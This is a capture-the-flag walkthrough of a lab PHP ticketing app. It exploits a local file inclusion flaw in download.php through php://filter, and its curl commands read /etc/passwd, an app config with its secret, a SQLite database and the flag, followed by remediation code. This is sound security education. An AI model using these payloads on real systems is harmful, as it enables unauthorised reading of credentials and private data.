# 🐝 DocketHive — A Beginner-Friendly PHP LFI Walkthrough

> **Box:** DocketHive (Webverse Pro)
> **Type:** PHP Web Application
> **Difficulty:** Beginner
> **Flag:** `WEBVERSE{...}`

---

## 📋 Synopsis

DocketHive is a Portland-based event ticketing SaaS — a real-world PHP web application with a subtle flaw in how it handles file access. The vulnerability exists in a **legitimate feature** of the application, and no brute force is required — just careful observation and an understanding of PHP stream wrappers.

---

## 🔍 Reconnaissance

### Port Scan

A single port was exposed:

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | nginx 1.29.8 / PHP 8.2.30 |

The server redirects to `app.dockethive.io` via a simple vhost configuration.

### Web Application Enumeration

Browsing to the application reveals a standard event ticketing SaaS:

![Login Page](https://i.imgur.com/placeholder-login.png)

The app has:
- User registration (attendee / organizer roles)
- Login with CSRF-protected forms
- Password reset functionality
- `/download.php` — a file download endpoint

---

## ⚙️ Source Code Analysis

### The download.php Endpoint

Hitting `/download.php?file=test` returns: `Missing file parameter` (if no param) or serves files from an uploads directory.

Let's look at the source by leveraging the very bug we're about to exploit:

```
GET /download.php?file=php://filter/convert.base64-encode/resource=download.php
```

Decoding the base64 gives us the full source:

```php
<?php
if (!isset($_GET['file'])) {
    header('HTTP/1.0 400 Bad Request');
    exit('Missing file parameter');
}

$file = $_GET['file'];

// Reject obviously malformed filenames
if (strpos($file, '../') !== false
    || strpos($file, '..\\') !== false
    || isset($file[0]) && $file[0] === '/'
    || stripos($file, 'file://') === 0) {
    header('HTTP/1.0 400 Bad Request');
    exit('Invalid file path.');
}

$path = __DIR__ . '/uploads/' . $file;

if (file_exists($path)) {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if ($ext === 'pdf') {
        header('Content-Type: application/pdf');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
    }
    readfile($path);
} else {
    readfile($file);   // <-- THE BUG
}
```

### 🔑 The Vulnerability

The developer implemented **path traversal filters** that block:
- `../` and `..\\` (directory traversal)
- Leading `/` (absolute paths)
- `file://` (PHP stream wrapper)

**But** there's a fatal logical flaw:

1. The code prepends `__DIR__ . '/uploads/'` to the filename
2. If the resulting path doesn't exist (`file_exists()` returns `false`), it falls through to `readfile($file)` with the **original, unsanitized** user input
3. `php://filter` is **not a real file** — it's a PHP stream wrapper — so `file_exists()` returns `false`
4. The `readfile($file)` call happily processes PHP stream wrappers, bypassing all the path traversal checks

---

## 💥 Exploitation

### Step 1: Verify LFI with /etc/passwd

```bash
curl -s 'http://app.dockethive.io/download.php?file=php://filter/convert.base64-encode/resource=/etc/passwd'
```

Returns base64, which decodes to:

```
root:x:0:0:root:/root:/bin/bash
...
eric:x:1001:1001::/home/eric:/bin/bash
```

We have a system user `eric` at `/home/eric`.

### Step 2: Read Application Source Code

```bash
# Read config.php
curl -s 'http://app.dockethive.io/download.php?file=php://filter/convert.base64-encode/resource=../src/config.php'
```

This reveals the database path, app secret, and session configuration:

```php
define('DB_PATH', '/var/db/dockethive.db');
define('APP_SECRET', 'dh_s3cr3t_k3y_pr0d_2024_x9f2m');
```

### Step 3: Dump the SQLite Database

```bash
curl -s 'http://app.dockethive.io/download.php?file=php://filter/convert.base64-encode/resource=/var/db/dockethive.db' -o db.b64
```

The SQLite database contains user accounts with bcrypt password hashes, password reset tokens, events, and orders — a complete picture of the application's internal state.

### Step 4: Capture the Flag

```bash
curl -s 'http://app.dockethive.io/download.php?file=php://filter/convert.base64-encode/resource=/home/eric/flag.txt'
```

And there it is:

> **Flag:** `WEBVERSE{php_f1lt3r_3r1c_h0m3_lf1}`

---

## 📊 Attack Chain Summary

```
User Input (file param)
        │
        ▼
Path traversal filters applied
  ┌─ Blocks: ../, ..\\, leading /, file://
  └─ Passes: php://filter (not in the blocklist!)
        │
        ▼
__DIR__ . '/uploads/' . $file  →  file_exists() check
        │
        ├── True  → readfile() from uploads directory (safe path)
        │
        └── False → readfile($file) ← RAW, UNSANITIZED INPUT!
                        │
                        ▼
               php://filter/convert.base64-encode/resource=/path/to/file
                        │
                        ▼
                 ARBITRARY FILE READ ✅
```

---

## 🛡️ Remediation

The fix is straightforward: **validate the resolved path**, not just the raw input.

```php
// Instead of trusting the original $file,
// resolve the path first, then verify it's within the allowed directory
$path = realpath(__DIR__ . '/uploads/' . basename($file));
if ($path === false || strpos($path, realpath(__DIR__ . '/uploads/')) !== 0) {
    exit('Invalid file path.');
}
readfile($path);
```

Or even simpler — **don't accept user-supplied filenames at all**. Use an index or UUID-based mapping:

```php
$allowed = [
    'receipt_abc123' => '/path/to/receipt_abc123.pdf',
    'ticket_def456'  => '/path/to/ticket_def456.pdf',
];
$key = $_GET['file'];
if (!isset($allowed[$key])) {
    exit('Invalid file.');
}
readfile($allowed[$key]);
```

---

## 🧠 Key Takeaways

1. **Blacklists are fragile** — The developer blocked `../`, `/`, and `file://`, but missed `php://filter`. Blocklists always have blind spots.
2. **`file_exists()` is not a security boundary** — Stream wrappers pass `file_exists()` checks inconsistently. Don't use it to gate security decisions.
3. **Read source code when you can** — Finding `/download.php` was step one, but reading its source revealed exactly why the exploit worked.
4. **PHP stream wrappers are powerful** — Beyond `php://filter`, wrappers like `php://input`, `data://`, and `expect://` can enable code execution depending on PHP configuration.

---

## 📚 References

- [PHP Manual: Stream Wrappers](https://www.php.net/manual/en/wrappers.php.php)
- [PHP: file_exists()](https://www.php.net/manual/en/function.file-exists.php)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Webverse Pro](https://webversepro.com)

---

*Writeup by [Your Name] — 2026*
